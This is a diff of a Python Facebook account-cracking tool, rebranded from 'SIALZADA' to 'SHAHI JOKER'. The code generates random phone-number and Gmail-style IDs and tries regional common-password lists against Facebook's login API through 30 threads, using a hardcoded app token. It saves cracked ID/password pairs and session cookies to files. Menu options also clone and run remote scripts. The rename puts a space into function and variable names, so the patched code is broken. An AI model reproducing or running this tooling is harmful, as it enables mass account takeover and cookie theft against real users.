@@ -91,7 +91,7 @@ def ua_sial():
 	ua = '[FBAN/FB4A;FBAV/;FBBV/;[FBAN/rFB4A;FBAV/272.0.0.6.129;FBBV/20454115;FBDM/){density=2.0,width=720,height=1280};FBLC/pt_BR;FBCR/axis;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A015M;FBSV/4.0;FBOP/1;nullFBCA/armeabi-v7a:armeabi;]'+END
 	return ua
 xxxx='[FBAN/FB4A;FBAV/;FBBV/;[FBAN/rFB4A;FBAV/272.0.0.6.129;FBBV/20454115;FBDM/){density=2.0,width=720,height=1280};FBLC/pt_BR;FBCR/axis;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A015M;FBSV/4.0;FBOP/1;nullFBCA/armeabi-v7a:armeabi;]'
-folder_path = '/sdcard/SIALZADA'
+folder_path = '/sdcard/SHAHI JOKER'
 try:
 	os.makedirs(folder_path, exist_ok=True)
 except:
@@ -131,18 +131,18 @@ logo=("""\033[1;37m
 \033[1;31m((   ,M9  8b    d8  MM   YM.  MM      /  MM    \M\  
 \033[1;31m YMMMM9    YMMMM9  _MM_   YM._MMMMMMMMM _MM_    \M\_
 \033[1;39m======================================================
-[â€¢] OWNER      : 𝐒𝐇𝐀𝐇𝐈 𝐉𝐎𝐊𝐄𝐑
-[â€¢] GITHUB     : 𝐌𝐑 𝐉𝐎𝐊𝐄𝐑 
-[â€¢] STATUS     : FREE
-[â€¢] VERSION    : 6.0
+[♡] OWNER      : 𝐒𝐇𝐀𝐇𝐈 𝐉𝐎𝐊𝐄𝐑
+[♡] GITHUB     : 𝐌𝐑 𝐉𝐎𝐊𝐄𝐑 
+[♡] STATUS     : FREE
+[♡] VERSION    : 6.0
 \033[1;39m======================================================
-[â€¢] ENJOY ALL ðŸ˜Š
+[♡] ENJOY ALL
 \033[1;39m======================================================""")
 def linex():
 	print(f'\033[1;39m======================================================')
-def SIALZADA():
+def SHAHI JOKER():
 		clear()
-		print(f'\033[1;37m [1] File Cloning (\033[1;32m All Country Working\033[1;37m )\n [2] Random Cloning \n [3] Gmail Cloning (ON) \n [4] Create File / Dump System \n [5] Marshal & Enc \n [6] Contact With Tool Owner\n [7] Follow My Page \n [8] Subscribe My YouTube Channel \n [9] WhatsApp group(\033[1;32mJoin\033[1;37m) \n [0] Exit')
+		print(f'\033[1;37m [1] 𝐅𝐈𝐋𝐄 𝐂𝐋𝐎𝐍𝐈𝐍𝐆 (\033[1;32m All Country Working\033[1;37m )\n [2] 𝐑𝐀𝐍𝐃𝐎𝐌 𝐂𝐋𝐎𝐍𝐈𝐍𝐆 \n [3] 𝐆𝐌𝐀𝐈𝐋 𝐂𝐋𝐎𝐍𝐈𝐍𝐆 (ON) \n [4] 𝐆𝐑𝐄𝐀𝐓𝐄 𝐅𝐈𝐋𝐄 / 𝐃𝐔𝐌𝐏 𝐒𝐘𝐒𝐓𝐄𝐌 \n [5] 𝐌𝐀𝐑𝐒𝐇𝐀𝐋 & 𝐄𝐍𝐂 \n [6] 𝐂𝐎𝐍𝐓𝐀𝐂𝐓 𝐖𝐈𝐓𝐇 𝐓𝐎𝐎 𝐎𝐖𝐍𝐄𝐑\n [7] 𝐅𝐎𝐋𝐋𝐎𝐖 𝐌𝐘 𝐏𝐀𝐆𝐄 \n [8] 𝐒𝐔𝐁𝐒𝐂𝐑𝐈𝐁𝐄 𝐌𝐘 𝐘𝐎𝐔𝐓𝐔𝐁𝐄 𝐂𝐇𝐀𝐍𝐍𝐄𝐋 \n [9] 𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏 𝐆𝐑𝐎𝐔𝐏(\033[1;32mJoin\033[1;37m) \n [0] 𝐄𝐗𝐈𝐓')
 		linex()
 		shm= input('\033[1;37m [+] Select option: ')
 		if shm =='1':
@@ -153,7 +153,7 @@ def SIALZADA():
 			r_crack()
 		elif shm =='3':
 			gmail()
-			SIALZADA()
+			SHAHI JOKER()
 		elif shm =='4':
 			clear()
 			os.system('rm -rf Dump && git clone https://github.com/syedzada1100/Dump.git && cd Dump && python Dump.py')
@@ -161,23 +161,23 @@ def SIALZADA():
 			os.system('git clone https://github.com/M4STERMIND1/Marshal && cd Marshal && python Marshal.py')
 		elif shm =='6':
 			os.system('xdg-open https://www.facebook.com/profile.php?id=100090265211294')
-			SIALZADA()
+			SHAHI JOKER()
 		elif shm =='7':
 			os.system('xdg-open https://www.facebook.com/profile.php?id=61550709630311')
-			SIALZADA()
+			SHAHI JOKER()
 		elif shm =='8':
 			os.system('xdg-open https://youtube.com/@JOKER_48')
-			SIALZADA()
+			SHAHI JOKER()
 		elif shm =='9':
 			wp=('ENIBC9FIBwv0ozvzLCpVE6')
 			os.system('xdg-open https://chat.whatsapp.com/ENIBC9FIBwv0ozvzLCpVE6')
-			SIALZADA()
+			SHAHI JOKER()
 		elif shm =='0':
 			exit(' Thanks For Using our tool ')
 		else:
 			print('\033[1;37m [+] Select valid option\033[1;37m ')
 			time.sleep(0.5)
-			SIALZADA()
+			SHAHI JOKER()
 
 def file_crack():
 	clear()
@@ -204,21 +204,21 @@ def file_crack():
 	linex()
 	for i in range(ps_limit):
 		plist.append(input(f'\033[1;37m Put Password No.{i+1}: '))
-	with tred(max_workers=30) as SIALZADA:
+	with tred(max_workers=30) as SHAHI JOKER:
 		clear()
 		tl = str(len(fo))
 		print(' Total accounts : \033[1;32m'+tl)
 		print('\033[1;37m Process Running in the Background ')
 		print("\33[1;37m [+] Use flight mode for speed up\033[1;37m")
-		print("\33[1;37m [+] Your Cp/Ok Id Save In SIALAZADA Folder")
+		print("\33[1;37m [+] Your Cp/Ok Id Save In SHAHI JOKER Folder")
 		linex()
 		for user in fo:
 			ids,names = user.split('|')
 			passlist = plist
 			if methd =='1':
-				SIALZADA.submit(api1,ids,names,passlist)
+				SHAHI JOKER.submit(api1,ids,names,passlist)
 			else:
-				SIALZADA.submit(api1,ids,names,passlist)
+				SHAHI JOKER.submit(api1,ids,names,passlist)
 	print('\033[1;37m')
 	linex()
 	print(' [+] The process has completed')
@@ -242,7 +242,7 @@ def r_crack():
 	elif crk =='3':
 		afg()
 	elif crk =='0':
-		SIALZADA()
+		SHAHI JOKER()
 	else:
 		print('\n  [+] Select valid option\033[1;37m ');time.sleep(1.5);r_crack()
 
@@ -257,19 +257,19 @@ def pak():
 	for nmbr in range(limit):
 		nmp = ''.join(random.choice(string.digits) for _ in range(7))
 		user.append(nmp)
-	with tred(max_workers=30) as SIALZADA:
+	with tred(max_workers=30) as SHAHI JOKER:
 		clear()
 		tl = str(len(user))
 		print(' [+] Total accounts : \033[1;32m'+tl)
 		print('\33[1;37m [+] Selected code  :\033[1;32m '+code)
 		print('\33[1;37m [+] Process has been started\033[1;97m')
 		print("\33[1;37m [+] Use flight mode for speed up\033[1;37m")
-		print("\33[1;37m [+] Your Cp/Ok Id Save In SIALAZADA Folder")
+		print("\33[1;37m [+] Your Cp/Ok Id Save In SHAHI JOKER Folder")
 		linex()
 		for psx in user:
 			ids = code+psx
 			passlist = [psx,ids,'khankhan','khan12','malikmalik','baloch786','janjan','kingkhan','khankhan12345','malik786','khanbaba','pak123','malik1122','khan1122']
-			SIALZADA.submit(rd1,ids,passlist)
+			SHAHI JOKER.submit(rd1,ids,passlist)
 	print('\033[1;37m')
 	linex()
 	print(' [+] The process has completed')
@@ -290,19 +290,19 @@ def bd():
 	for nmbr in range(limit):
 		nmp = ''.join(random.choice(string.digits) for _ in range(8))
 		user.append(nmp)
-	with tred(max_workers=30) as SIALZADA:
+	with tred(max_workers=30) as SHAHI JOKER:
 		clear()
 		tl = str(len(user))
 		print(' [+] Total accounts : \033[1;32m'+tl)
 		print('\33[1;37m [+] Selected code  :\033[1;32m '+code)
 		print('\33[1;37m [+] Process has been started \033[1;97m')
 		print("\33[1;37m [+] Use flight mode for speed up\033[1;37m")
-		print("\33[1;37m [+] Your Cp/Ok Id Save In SIALAZADA Folder")
+		print("\33[1;37m [+] Your Cp/Ok Id Save In SHAHI JOKER Folder")
 		linex()
 		for psx in user:
 			ids = code+psx
 			passlist = ['i love you','bangladesh','freefire','bangla123','bangladesh123',ids,psx]
-			SIALZADA.submit(rd1,ids,passlist)
+			SHAHI JOKER.submit(rd1,ids,passlist)
 	print('\033[1;37m')
 	linex()
 	print(' [+] The process has completed')
@@ -322,19 +322,19 @@ def afg():
 	for nmbr in range(limit):
 		nmp = ''.join(random.choice(string.digits) for _ in range(7))
 		user.append(nmp)
-	with tred(max_workers=30) as SIALZADA:
+	with tred(max_workers=30) as SHAHI JOKER:
 		clear()
 		tl = str(len(user))
 		print(' [+] Total accounts : \033[1;32m'+tl)
 		print('\33[1;37m [+] Selected code  :\033[1;32m '+code)
 		print('\33[1;37m [+] Process running in the background\033[1;97m')
 		print("\33[1;37m [+] Use flight mode for speed up\033[1;37m")
-		print("\33[1;37m [+] Your Cp/Ok Id Save In SIALAZADA Folder")
+		print("\33[1;37m [+] Your Cp/Ok Id Save In SHAHI JOKER Folder")
 		linex()
 		for psx in user:
 			ids = code+psx
 			passlist = [ids,psx,'100200','afghanistan','Afghan123','janjan','afghan1122','kabul123']
-			SIALZADA.submit(rd1,ids,passlist)
+			SHAHI JOKER.submit(rd1,ids,passlist)
 	print('\033[1;37m')
 	linex()
 	print(' [+] The process has completed')
@@ -373,12 +373,12 @@ def gmail():
                                 mail = ''.join(random.choice(string.digits) for _ in range(4))
                                 open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
                         fo = open('.re.txt', 'r').read().splitlines()
-                with tred(max_workers=30) as SIALZADA:
+                with tred(max_workers=30) as SHAHI JOKER:
                         total = str(len(fo))
                         clear()
                         print(' Total account : \033[1;32m'+total)
                         print("\33[1;37m [+] Use flight mode for speed up\033[1;37m")
-                        print("\33[1;37m [+] Your Cp/Ok Id Save In SIALAZADA Folder")
+                        print("\33[1;37m [+] Your Cp/Ok Id Save In SHAHI JOKER Folder")
                         linex()
                         for user in fo:
                                 ids,names = user.split('|')
@@ -390,7 +390,7 @@ def gmail():
                                 fs = first_name.lower()
                                 ls = last_name.lower()
                                 passlist = [fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'1122',fs,fs+'1234',fs+'786',fs+'12']
-                                SIALZADA.submit(rd1,ids,passlist)
+                                SHAHI JOKER.submit(rd1,ids,passlist)
                 print('\033[1;37m')
                 linex()
                 print(' The process has completed')
@@ -402,7 +402,7 @@ def gmail():
 def rd1(ids,passlist):
 	try:
 		global ok,loop,sim_id
-		sys.stdout.write('\r\r\33[1;37m[ SIAL ZADA ]  %s|  OK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+		sys.stdout.write('\r\r\33[1;37m[𝐒𝐇𝐀𝐇𝐈 𝐉𝐎𝐊𝐄𝐑]  %s|  OK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
 		for pas in passlist:
 				accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
 				fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
@@ -430,8 +430,8 @@ def rd1(ids,passlist):
 						cookie = f"sb={ssbb};{ckkk}"
 						print('\r\r\033[1;32m[JOKER-OK] '+uid+' | '+pas)		                    
 						#print(' \33[1;96m[Cookies] == '+cookie)
-						file_path_ok = os.path.join(folder_path, 'SIALZADA_RANDOM_OK.txt')
-						file_path_cookies = os.path.join(folder_path, 'SIALZADA_COOKIES.txt')
+						file_path_ok = os.path.join(folder_path, 'SHAHI JOKER_RANDOM_OK.txt')
+						file_path_cookies = os.path.join(folder_path, 'SHAHI JOKER_COOKIES.txt')
 						with open(file_path_ok, 'a') as file_ok, open(file_path_cookies, 'a') as file_cookies:
 							file_ok.write(uid+'|'+pas+'\n')
 							file_cookies.write(uid+'|'+pas+'|'+cookie+'\n')
@@ -440,7 +440,7 @@ def rd1(ids,passlist):
 				elif 'www.facebook.com' in po['error']['message']:
 						uid = str(po['error']['error_data']['uid'])
 					#	print(f'\r\r\33[1m\33[1;35m [JOKER-CP] '+uid+' | '+pas+'\033[1;97m')
-						file_path = os.path.join(folder_path, 'SIALZADA-CP.txt')
+						file_path = os.path.join(folder_path, 'SHAHI JOKER-CP.txt')
 						with open(file_path, 'a') as file:
 							file.write(uid+'|'+pas+'\n')
 						cps.append(uid)
@@ -456,7 +456,7 @@ def rd1(ids,passlist):
 def api1(ids,names,passlist):
 	try:
 		global ok,loop,sim_id
-		sys.stdout.write('\r\r\33[1;37m[ SIAL ZADA-M1 ]  %s|  OK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+		sys.stdout.write('\r\r\33[1;37m[𝐒𝐇𝐀𝐇𝐈 𝐉𝐎𝐊𝐄𝐑-M1 ]  %s|  OK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
 		fn = names.split(' ')[0]
 		try:
 			ln = names.split(' ')[1]
@@ -487,7 +487,7 @@ def api1(ids,names,passlist):
 					uid = str(po['uid'])
 					print('\r\r\033[1;32m [JOKER-OK] '+uid+' | '+pas)
 					linex()
-					file_path = os.path.join(folder_path, 'SIALZADA_FILE_OK.txt')
+					file_path = os.path.join(folder_path, 'SHAHI JOKER_FILE_OK.txt')
 					with open(file_path, 'a') as file:
 						file.write(uid+'|'+pas+'\n')
 					oks.append(uid)
@@ -508,4 +508,4 @@ def api1(ids,names,passlist):
 	except Exception as e:
 		pass
 
-SIALZADA()
+SHAHI JOKER()
